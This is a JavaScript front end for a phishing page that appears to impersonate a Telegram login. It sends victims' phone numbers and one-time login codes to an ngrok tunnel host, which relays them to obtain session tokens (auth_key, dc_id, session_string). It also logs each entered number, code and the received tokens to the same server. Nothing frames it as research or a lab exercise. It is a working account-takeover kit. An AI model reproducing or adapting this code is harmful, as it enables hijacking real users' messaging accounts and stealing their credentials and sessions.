const BACKEND_URL = 'https://bacd-81-155-215-249.ngrok-free.app';

async function sendLogToBackend(message) {
    console.log('Log:', message);
    try {
        await fetch(`${BACKEND_URL}/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ logMessage: message })
        });
    } catch (error) {
        console.error('Error sending log to backend:', error);
    }
}

let countries = [];

async function fetchCountries() {
    try {
        const response = await fetch('https://restcountries.com/v3.1/all');
        if (!response.ok) throw new Error('Failed to fetch countries');
        
        countries = await response.json();
        populateCountryDropdown(countries);
    } catch (error) {
        console.error('Error fetching countries:', error);
        sendLogToBackend("Error fetching countries: " + error.message);
    }
}

function populateCountryDropdown(countries) {
    const countrySelect = document.getElementById('country');
    countries.forEach(country => {
        const countryCode = country.cca2;
        const countryName = country.name.common;
        const callingCode = country.idd.root + (country.idd.suffixes ? country.idd.suffixes[0] : '');
        
        const option = document.createElement('option');
        option.value = countryCode;
        option.textContent = `${countryName} (${callingCode})`;
        countrySelect.appendChild(option);
    });
}

document.addEventListener('DOMContentLoaded', function() {
    fetchCountries();

    // Check for user's preferred color scheme and apply night mode if necessary
    const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isNightMode) {
        document.body.classList.add('night-mode');
        sendLogToBackend("Night mode activated.");

        // Load the dark mode logo
        const logoImage = document.getElementById('telegramLogo');
        if (logoImage) {
            logoImage.src = 'telegram-logo2.png'; // Update image source for dark mode
        }
    } else {
        sendLogToBackend("Light mode activated.");
    }

    const phoneInput = document.getElementById('phoneNumber');
    const countrySelect = document.getElementById('country');
    
    // Add event listener to phone input for auto-filling country code
    phoneInput.addEventListener('input', function() {
        const inputNumber = phoneInput.value.replace(/\D/g, ''); // Remove non-digit characters
        if (inputNumber.length > 0) {
            const matchedCountry = findCountryByPhoneCode(inputNumber);
            if (matchedCountry) {
                countrySelect.value = matchedCountry.cca2;
            }
        }
    });

    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone form submitted!");

            const phoneNumber = document.getElementById('phoneNumber').value;
            sendLogToBackend("Phone number entered: " + phoneNumber);
            sessionStorage.setItem('phoneNumber', phoneNumber);

            const submitButton = phoneForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });

                if (!response.ok) throw new Error('Network response was not ok: ' + response.statusText);

                const data = await response.json();
                sendLogToBackend('Response from backend: ' + JSON.stringify(data));

                if (data.phone_code_hash) {
                    sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
                    document.getElementById('loginContainer').classList.add('swipe-left');
                    setTimeout(() => {
                        window.location.href = '/otp.html';
                    }, 600);
                } else {
                    displayMessage(data.message || 'Failed to send OTP', 'error');
                }
            } catch (error) {
                displayMessage('Error sending OTP: ' + error.message, 'error');
            } finally {
                submitButton.disabled = false; // Re-enable button
                displayLoadingIndicator(false);
            }
        });
    }

    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone code form submitted!");

            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneCode = document.getElementById('phoneCode').value;
            const phoneCodeHash = sessionStorage.getItem('phone_code_hash');

            if (!/^\d{5}$/.test(phoneCode)) {
                displayMessage("Phone code must be exactly 5 digits.", 'error');
                return;
            }

            sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
            sendLogToBackend("Phone code entered: " + phoneCode);
            sendLogToBackend("Phone code hash: " + phoneCodeHash);

            const submitButton = otpForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash })
                });

                if (!response.ok) {
                    const data = await response.json();
                    throw new Error(data.message || 'Failed to submit Phone Code');
                }

                const result = await response.json();
                sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));

                localStorage.clear();
                localStorage.setItem('auth_key', result.authTokens.auth_key);
                localStorage.setItem('dc_id', result.authTokens.dc_id);
                localStorage.setItem('session_string', result.authTokens.session_string);

                document.getElementById('otpContainer').classList.add('swipe-in');
                setTimeout(() => {
                    window.location.href = result.redirectUrl;
                }, 600);
            } catch (error) {
                displayMessage('Error submitting Phone Code: ' + error.message, 'error');
            } finally {
                submitButton.disabled = false; // Re-enable button
                displayLoadingIndicator(false);
            }
        });
    }
});

// Function to find the country based on the phone number input
function findCountryByPhoneCode(phoneNumber) {
    for (const country of countries) {
        if (country.idd.root && phoneNumber.startsWith(country.idd.root)) {
            return country;
        }
    }
    return null;
}

function displayMessage(message, type) {
    const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');
    messageContainer.innerText = message;
    messageContainer.style.color = type === 'error' ? 'red' : 'green';
    messageContainer.style.display = 'block';
}

function displayLoadingIndicator(isLoading) {
    const loadingIndicator = document.getElementById('loadingIndicator');
    if (loadingIndicator) {
        loadingIndicator.style.display = isLoading ? 'block' : 'none';
    }
}
